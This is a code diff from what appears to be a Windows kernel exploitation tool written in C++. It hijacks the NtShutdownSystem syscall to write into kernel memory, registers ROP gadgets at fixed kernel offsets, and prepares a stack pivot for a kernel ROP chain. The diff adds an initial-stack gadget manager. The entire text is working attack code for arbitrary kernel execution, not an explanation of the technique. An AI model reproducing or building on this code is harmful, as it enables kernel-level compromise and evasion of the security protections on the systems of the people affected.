@@ -56,7 +56,10 @@ int main()
     reinterpret_cast<void* (*)(void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, 0x8);
     KernelCaller.DisableRedirectByName("NtShutdownSystem");
 
-    StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));
+    StackManager InitStackManager(Driver::GetKernelModuleBase());
+    InitStackManager.AddGadget(0x3f5ddc, "(InitStack) nop; ret;");
+
+    StackManager KernelStackManager(Driver::GetKernelModuleBase(), &InitStackManager);
 
     // setup ropchain for our main loop
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
@@ -175,7 +178,7 @@ int main()
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
-    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(true), KernelStackManager.GetStackSize(true));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(OriginalStackAllocation, KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
     KernelCaller.DisableRedirectByName("NtShutdownSystem");
 
